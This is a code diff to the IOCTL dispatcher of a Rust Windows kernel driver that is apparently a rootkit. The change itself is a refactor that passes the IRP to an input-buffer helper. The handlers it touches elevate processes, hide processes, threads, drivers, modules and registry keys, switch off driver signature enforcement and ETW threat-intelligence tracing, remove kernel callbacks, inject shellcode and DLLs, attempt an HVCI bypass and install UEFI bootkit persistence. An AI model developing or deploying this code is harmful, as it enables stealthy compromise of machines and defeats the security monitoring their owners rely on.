@@ -103,7 +103,7 @@ impl IoctlManager {
         self.register_handler(ELEVATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
                 // Retrieves the process information from the input buffer
-                let target_process = get_input_buffer::<TargetProcess>(stack)?;
+                let target_process = get_input_buffer::<TargetProcess>(irp, stack)?;
                 let pid = (*target_process).pid;
 
                 // Update the IoStatus with the size of the process information
@@ -118,7 +118,7 @@ impl IoctlManager {
         self.register_handler(HIDE_UNHIDE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
                 // Retrieves the process information from the input buffer
-                let target_process = get_input_buffer::<TargetProcess>(stack)?;
+                let target_process = get_input_buffer::<TargetProcess>(irp, stack)?;
                 let pid = (*target_process).pid;
                 
                 // Hide or unhide the process based on the 'enable' flag
@@ -156,7 +156,7 @@ impl IoctlManager {
         self.register_handler(TERMINATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
                 // Retrieves the process information from the input buffer
-                let target_process = get_input_buffer::<TargetProcess>(stack)?;
+                let target_process = get_input_buffer::<TargetProcess>(irp, stack)?;
                 let pid = (*target_process).pid;
 
                 // Update the IoStatus with the size of the process information
@@ -171,7 +171,7 @@ impl IoctlManager {
         self.register_handler(SIGNATURE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
                 // Retrieves the process information from the input buffer
-                let target_process = get_input_buffer::<TargetProcess>(stack)?;
+                let target_process = get_input_buffer::<TargetProcess>(irp, stack)?;
                 let pid = (*target_process).pid;
                 let sg = (*target_process).sg;
                 let tp = (*target_process).tp;
@@ -245,7 +245,7 @@ impl IoctlManager {
         self.register_handler(ENABLE_DSE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
                 // Get the input buffer containing DSE information
-                let target_dse = get_input_buffer::<DSE>(stack)?;
+                let target_dse = get_input_buffer::<DSE>(irp, stack)?;
 
                 // Call to enable or disable DSE based on the input
                 let status = misc::set_dse_state((*target_dse).enable)?;
@@ -290,7 +290,7 @@ impl IoctlManager {
         self.register_handler(ETWTI, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
                 // Get the input buffer containing ETW tracing information
-                let target_etw = get_input_buffer::<ETWTI>(stack)?;
+                let target_etw = get_input_buffer::<ETWTI>(irp, stack)?;
 
                 // Call to enable or disable ETW tracing based on the input
                 let status = misc::etwti_enable_disable((*target_etw).enable)?;
@@ -319,7 +319,7 @@ impl IoctlManager {
                 drop(protected_ports);
 
                 // Get the target port from the input buffer
-                let target_port = get_input_buffer::<TargetPort>(stack)?;
+                let target_port = get_input_buffer::<TargetPort>(irp, stack)?;
 
                 // Add or remove the target port from the protected list
                 let status = if (*target_port).enable {
@@ -346,7 +346,7 @@ impl IoctlManager {
         self.register_handler(ENUMERATE_MODULE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
                 // Get the target process from the input buffer
-                let target_process = get_input_buffer::<TargetProcess>(stack)?;
+                let target_process = get_input_buffer::<TargetProcess>(irp, stack)?;
                 let (module_info, max_entries) = get_output_buffer::<ModuleInfo>(irp, stack)?;
                 let pid = (*target_process).pid;
 
@@ -379,7 +379,7 @@ impl IoctlManager {
         self.register_handler(HIDE_MODULE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
                 // Get the target module information from the input buffer
-                let target = get_input_buffer::<TargetModule>(stack)?;
+                let target = get_input_buffer::<TargetModule>(irp, stack)?;
                 
                 // Hide the module based on the PID and module name
                 let status = module::hide_module((*target).pid, &(*target).module_name.to_lowercase())?;
@@ -397,7 +397,7 @@ impl IoctlManager {
         self.register_handler(INJECTION_SHELLCODE_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
                 // Get the input buffer with the injection data
-                let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
+                let input_buffer = get_input_buffer::<TargetInjection>(irp, stack)?;
                 let pid = (*input_buffer).pid;
                 let path = (*input_buffer).path.as_str();
 
@@ -413,7 +413,7 @@ impl IoctlManager {
         self.register_handler(INJECTION_SHELLCODE_APC, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
                 // Get the input buffer with the injection data
-                let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
+                let input_buffer = get_input_buffer::<TargetInjection>(irp, stack)?;
                 let pid = (*input_buffer).pid;
                 let path = (*input_buffer).path.as_str();
 
@@ -429,7 +429,7 @@ impl IoctlManager {
         self.register_handler(INJECTION_DLL_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
                 // Get the input buffer with the injection data
-                let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
+                let input_buffer = get_input_buffer::<TargetInjection>(irp, stack)?;
                 let pid = (*input_buffer).pid;
                 let path = (*input_buffer).path.as_str();
 
@@ -445,7 +445,7 @@ impl IoctlManager {
         self.register_handler(INJECTION_DLL_APC, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
                 // Get the input buffer with the injection data
-                let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
+                let input_buffer = get_input_buffer::<TargetInjection>(irp, stack)?;
                 let pid = (*input_buffer).pid;
                 let path = (*input_buffer).path.as_str();
 
@@ -461,7 +461,7 @@ impl IoctlManager {
         self.register_handler(INJECTION_SHELLCODE_THREAD_HIJACKING, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
                 // Get the input buffer with the injection data
-                let input_buffer = get_input_buffer::<TargetInjection>(stack)?;
+                let input_buffer = get_input_buffer::<TargetInjection>(irp, stack)?;
                 let pid = (*input_buffer).pid;
                 let path = (*input_buffer).path.as_str();
 
@@ -479,7 +479,7 @@ impl IoctlManager {
         // Hiding / Unhiding a driver from the PsLoadedModuleList
         self.register_handler(HIDE_UNHIDE_DRIVER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
-                let target_driver = get_input_buffer::<TargetDriver>(stack)?;
+                let target_driver = get_input_buffer::<TargetDriver>(irp, stack)?;
                 let driver_name = &(*target_driver).name;
 
                 // Perform the operation based on whether we are hiding or unhiding the driver
@@ -543,7 +543,7 @@ impl IoctlManager {
         #[cfg(not(feature = "mapper"))] {
             self.register_handler(BLOCK_DRIVER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
                 unsafe {
-                    let target_driver = get_input_buffer::<TargetDriver>(stack)?;
+                    let target_driver = get_input_buffer::<TargetDriver>(irp, stack)?;
                     let driver_name = &(*target_driver).name;
     
                     let status = if (*target_driver).enable {
@@ -566,7 +566,7 @@ impl IoctlManager {
         self.register_handler(HIDE_UNHIDE_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
                 // Retrieves the thread information from the input buffer
-                let target_thread = get_input_buffer::<TargetThread>(stack)?;
+                let target_thread = get_input_buffer::<TargetThread>(irp, stack)?;
                 let tid = (*target_thread).tid;
 
                 // Hide or unhide the thread based on the 'enable' flag
@@ -605,7 +605,7 @@ impl IoctlManager {
             unsafe {
                 // Retrieves the output buffer to store thread information.
                 let (output_buffer, max_entries) = get_output_buffer::<TargetThread>(irp, stack)?;
-                let input_target = get_input_buffer::<TargetThread>(stack)?;
+                let input_target = get_input_buffer::<TargetThread>(irp, stack)?;
 
                 // Based on the options, either enumerate hidden or protected threads.
                 let threads = match (*input_target).options {
@@ -634,7 +634,7 @@ impl IoctlManager {
             self.register_handler(PROTECTION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
                 unsafe {
                     // Retrieves the thread information from the input buffer
-                    let thread_protection = get_input_buffer::<TargetThread>(stack)?;
+                    let thread_protection = get_input_buffer::<TargetThread>(irp, stack)?;
                     let tid = (*thread_protection).tid;
                     let enable = (*thread_protection).enable;
 
@@ -658,7 +658,7 @@ impl IoctlManager {
         // Lists Callbacks.
         self.register_handler(ENUMERATE_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
-                let target_callback = get_input_buffer::<CallbackInfoInput>(stack)?;
+                let target_callback = get_input_buffer::<CallbackInfoInput>(irp, stack)?;
                 let (callback_info, max_entries) = get_output_buffer::<CallbackInfoOutput>(irp, stack)?;
                 let callbacks = match (*target_callback).callback {
                     Callbacks::PsSetCreateProcessNotifyRoutine 
@@ -718,7 +718,7 @@ impl IoctlManager {
         // Restore Callback.
         self.register_handler(RESTORE_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
-                let target_callback = get_input_buffer::<CallbackInfoInput>(stack)?;
+                let target_callback = get_input_buffer::<CallbackInfoInput>(irp, stack)?;
                 let status = match (*target_callback).callback {
                     Callbacks::PsSetCreateProcessNotifyRoutine 
                     | Callbacks::PsSetCreateThreadNotifyRoutine
@@ -739,7 +739,7 @@ impl IoctlManager {
         // List Callbacks Removed.
         self.register_handler(ENUMERATE_REMOVED_CALLBACK, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
-                let target_callback = get_input_buffer::<CallbackInfoInput>(stack)?;
+                let target_callback = get_input_buffer::<CallbackInfoInput>(irp, stack)?;
                 let (callback_info, max_entries) = get_output_buffer::<CallbackInfoOutput>(irp, stack)?;
                 let callbacks = match (*target_callback).callback {
                     Callbacks::PsSetCreateProcessNotifyRoutine 
@@ -780,7 +780,7 @@ impl IoctlManager {
         // HVCI Bypass attempt
         self.register_handler(HVCI_BYPASS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
-                let target = get_input_buffer::<TargetProcess>(stack)?;
+                let target = get_input_buffer::<TargetProcess>(irp, stack)?;
                 // Call core hvci module
                 let status = shadow_core::hvci::disable_hvci()?;
                 
@@ -792,7 +792,7 @@ impl IoctlManager {
         // UEFI Bootkit Persistence
         self.register_handler(UEFI_PERSIST, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
             unsafe {
-                let target = get_input_buffer::<TargetInjection>(stack)?;
+                let target = get_input_buffer::<TargetInjection>(irp, stack)?;
                 let path = (*target).path.as_str();
                 
                 // Call core bootkit module
@@ -824,7 +824,7 @@ impl IoctlManager {
         // Adding protection for registry key values
         self.register_handler(REGISTRY_PROTECTION_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
-                let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
+                let target_registry = get_input_buffer::<TargetRegistry>(irp, stack)?;
                 let status = Registry::modify_key_value(target_registry, Type::Protect);
 
                 (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
@@ -835,7 +835,7 @@ impl IoctlManager {
         // Added protection for registry keys
         self.register_handler(REGISTRY_PROTECTION_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
-                let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
+                let target_registry = get_input_buffer::<TargetRegistry>(irp, stack)?;
                 let status = Registry::modify_key(target_registry, Type::Protect);
 
                 (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
@@ -846,7 +846,7 @@ impl IoctlManager {
         // Handles IOCTL to hide or unhide a registry key
         self.register_handler(HIDE_UNHIDE_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
-                let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
+                let target_registry = get_input_buffer::<TargetRegistry>(irp, stack)?;
                 let status = Registry::modify_key(target_registry, Type::Hide);
 
                 (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
@@ -857,7 +857,7 @@ impl IoctlManager {
         // Handles IOCTL to hide or unhide a registry value.
         self.register_handler(HIDE_UNHIDE_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
             unsafe {
-                let target_registry = get_input_buffer::<TargetRegistry>(stack)?;
+                let target_registry = get_input_buffer::<TargetRegistry>(irp, stack)?;
                 let status = Registry::modify_key_value(target_registry, Type::Hide);
 
                 (*irp).IoStatus.Information = size_of::<TargetRegistry>() as u64;
